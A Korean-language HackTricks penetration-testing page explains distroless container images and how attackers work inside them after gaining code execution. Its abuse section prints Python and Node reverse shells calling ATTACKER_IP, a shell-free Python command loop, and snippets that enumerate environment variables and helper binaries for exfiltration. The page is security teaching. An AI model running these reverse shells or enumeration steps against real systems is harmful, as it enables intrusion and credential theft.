# Distroless 컨테이너

{{#include ../../../banners/hacktricks-training.md}}

## 개요

**distroless** 컨테이너 이미지는 **하나의 특정 애플리케이션을 실행하는 데 필요한 최소 런타임 구성 요소만 포함**하도록 설계된 이미지로, 의도적으로 패키지 매니저, 셸, 그리고 대량의 일반적인 userland 유틸리티 같은 배포 도구를 제거합니다. 실제로 distroless 이미지는 종종 애플리케이션 바이너리나 런타임, 공유 라이브러리, 인증서 번들, 그리고 매우 작은 파일시스템 레이아웃만을 포함합니다.

요점은 distroless가 새로운 커널 격리 원시 기능이라는 것이 아닙니다. Distroless는 **이미지 설계 전략**입니다. 커널이 컨테이너를 어떻게 격리하는지가 아니라 컨테이너 파일시스템 내부에 무엇이 존재하는지를 바꿉니다. 이 구분은 중요합니다. distroless는 주로 코드 실행을 획득한 이후 공격자가 사용할 수 있는 것을 줄임으로써 환경을 강화합니다. 네임스페이스, seccomp, capabilities, AppArmor, SELinux 또는 다른 런타임 격리 메커니즘을 대체하지 않습니다.

## Distroless가 존재하는 이유

Distroless 이미지는 주로 다음을 줄이기 위해 사용됩니다:

- 이미지 크기
- 이미지의 운영 복잡성
- 취약점을 포함할 수 있는 패키지 및 바이너리 수
- 기본적으로 공격자가 사용할 수 있는 post-exploitation 도구 수

이 때문에 distroless 이미지는 프로덕션 애플리케이션 배포에서 인기가 있습니다. 셸도 없고 패키지 매니저도 없으며 거의 일반적인 툴링이 없는 컨테이너는 운영적으로 이해하기 쉽고 침해 후 대화형으로 악용되기 어렵습니다.

잘 알려진 distroless 스타일 이미지 계열의 예시는 다음과 같습니다:

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless가 의미하지 않는 것

distroless 컨테이너는 **자동으로** 다음과 같은 것이 아닙니다:

- rootless
- non-privileged
- read-only
- seccomp, AppArmor, 또는 SELinux로 자동 보호되는 것
- container escape로부터 자동으로 안전한 것

여전히 `--privileged`로 distroless 이미지를 실행하거나 호스트 네임스페이스를 공유하거나, 위험한 바인드 마운트나 마운트된 런타임 소켓을 사용할 수 있습니다. 그런 상황에서는 이미지가 최소화되어 있더라도 컨테이너는 치명적으로 취약할 수 있습니다. Distroless는 **userland 공격 표면**을 바꾸는 것이지 **커널 신뢰 경계**를 바꾸는 것은 아닙니다.

## 전형적인 운영 특성

distroless 컨테이너를 침해하면 보통 가장 먼저 알게 되는 것은 일반적인 가정들이 더 이상 성립하지 않는다는 것입니다. `sh`가 없을 수 있고, `bash`, `ls`, `id`, `cat`이 없을 수 있으며 때로는 평소의 트레이드크래프트가 기대하는 방식으로 동작하는 libc 기반 환경조차 없을 수 있습니다. 이는 공격과 방어 모두에 영향을 줍니다. 툴이 부족하면 디버깅, 사고 대응, 그리고 post-exploitation이 달라집니다.

가장 흔한 패턴은 다음과 같습니다:

- 애플리케이션 런타임은 존재하지만 그 외엔 거의 없음
- 셸 기반 페이로드는 셸이 없어 실패함
- 도우미 바이너리가 없어서 흔한 열거용 원라이너들이 실패함
- 읽기 전용 rootfs 또는 쓰기 가능한 tmpfs 위치에 대한 `noexec` 같은 파일시스템 보호가 자주 존재함

이 조합이 보통 사람들이 "weaponizing distroless"에 대해 이야기하게 만드는 이유입니다.

## Distroless와 Post-Exploitation

distroless 환경에서의 주요 공격 과제는 항상 초기 RCE만은 아닙니다. 종종 그 다음 단계가 문제입니다. 만약 취약해진 워크로드가 Python, Node.js, Java, 또는 Go 같은 언어 런타임에서 코드 실행을 제공한다면, 임의의 로직을 실행할 수는 있지만 다른 Linux 대상에서 흔한 셸 중심 워크플로를 통해 하지는 못할 수 있습니다.

그런 의미에서 post-exploitation은 보통 세 가지 방향 중 하나로 이동합니다:

1. **기존 언어 런타임을 직접 사용**하여 환경을 열거하고, 소켓을 열고, 파일을 읽거나 추가 페이로드를 스테이징한다.
2. **파일시스템이 읽기 전용이거나 쓰기 가능한 위치가 `noexec`로 마운트된 경우 메모리로 자체 툴링을 들여오기**.
3. **애플리케이션이나 그 의존성이 예상외로 유용한 것을 포함하고 있다면 이미 이미지에 존재하는 바이너리를 악용**.

## Abuse

### 이미 존재하는 런타임 열거

많은 distroless 컨테이너에는 셸이 없지만 애플리케이션 런타임은 여전히 존재합니다. 대상이 Python 서비스라면 Python이 있고, 대상이 Node.js라면 Node가 있습니다. 이는 파일을 열거하고, 환경 변수를 읽고, 리버스 셸을 열고, `/bin/sh`를 호출하지 않고 메모리 내 실행을 스테이징하는 데 충분한 기능을 제공하는 경우가 많습니다.

Python을 이용한 간단한 예:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js를 사용한 간단한 예:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
영향:

- environment variables 복구(종종 credentials 또는 service endpoints 포함)
- filesystem 열거 (`/bin/ls` 없음)
- writable paths 및 mounted secrets 식별

### Reverse Shell Without `/bin/sh`

이미지에 `sh`나 `bash`가 포함되어 있지 않으면, 전형적인 shell 기반 reverse shell은 즉시 실패할 수 있다. 그런 경우에는 대신 설치된 언어 런타임을 사용하라.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh`가 존재하지 않는다면, 마지막 줄을 직접 Python으로 명령을 실행하도록 하거나 Python REPL 루프로 교체하세요.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
다시 말해 `/bin/sh`가 없으면 셸을 실행하는 대신 Node의 filesystem, process, networking APIs를 직접 사용하세요.

### 전체 예제: No-Shell Python 명령 루프

이미지에 Python은 있지만 전혀 쉘이 없다면, 간단한 인터랙티브 루프만으로도 완전한 post-exploitation 기능을 유지하기에 충분한 경우가 많습니다:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
이것은 대화형 셸 바이너리를 필요로 하지 않습니다. 공격자의 관점에서 영향은 기본 셸과 사실상 동일합니다: 명령 실행, enumeration, 그리고 기존 런타임을 통한 추가 페이로드의 staging.

### 메모리 내 도구 실행

Distroless 이미지는 종종 다음과 함께 사용됩니다:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

이러한 조합은 고전적인 "download binary to disk and run it" 워크플로를 신뢰할 수 없게 만듭니다. 이런 경우 메모리 실행 기법이 주된 해결책이 됩니다.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### 이미지에 이미 존재하는 바이너리

일부 distroless 이미지에는 여전히 운영상 필요한 바이너리가 포함되어 있어, 침해 후 유용해집니다. 반복적으로 관찰되는 예시는 `openssl`인데, 애플리케이션이 때때로 crypto- 또는 TLS-related 작업에 필요하기 때문입니다.

빠른 검색 패턴은:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

실제 악용은 실제로 무엇이 설치되어 있는지에 따라 달라지지만, 일반적인 요지는 distroless가 "도구가 전혀 없는"을 의미하는 것이 아니라, "일반 배포 이미지보다 훨씬 적은 도구"를 의미한다.

## 점검

이 점검의 목적은 이미지가 실제로 distroless인지, 그리고 post-exploitation에 여전히 사용 가능한 runtime 또는 helper binaries가 무엇인지 확인하는 것이다.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
What is interesting here:

- shell이 없지만 Python 또는 Node 같은 runtime이 존재하면, post-exploitation은 runtime-driven execution으로 전환해야 한다.
- 루트 파일시스템이 읽기 전용이고 `/dev/shm`는 쓰기 가능하지만 `noexec`인 경우, memory execution techniques의 중요성이 커진다.
- `openssl`, `busybox`, `java` 같은 helper binaries가 존재하면 추가 접근을 확보하는 데 필요한 기능을 제공할 수 있다.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | 설계상 최소화된 userland | shell 없음, package manager 없음, application/runtime dependencies만 포함 | 디버깅 레이어 추가, sidecar shells 배치, busybox 또는 툴 복사 |
| Chainguard minimal images | 설계상 최소화된 userland | 패키지 표면 감소, 주로 하나의 runtime 또는 서비스에 집중 | `:latest-dev` 또는 debug 변형 사용, 빌드 중 도구 복사 |
| Kubernetes workloads using distroless images | Pod 구성에 따라 다름 | Distroless는 userland에만 영향; Pod 보안 태세는 Pod spec 및 runtime defaults에 의존 | 에페메랄 debug 컨테이너 추가, host mounts, privileged Pod 설정 |
| Docker / Podman running distroless images | 실행 플래그에 따라 다름 | 최소한의 파일시스템, 하지만 runtime 보안은 플래그와 데몬 구성에 의존 | `--privileged`, host namespace 공유, runtime socket mounts, writable host binds |

핵심은 distroless가 런타임 보호가 아닌 **이미지 속성**이라는 점이다. 그 가치는 타협 후 파일시스템 내부에 남아 있는 항목을 줄이는 데서 온다.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
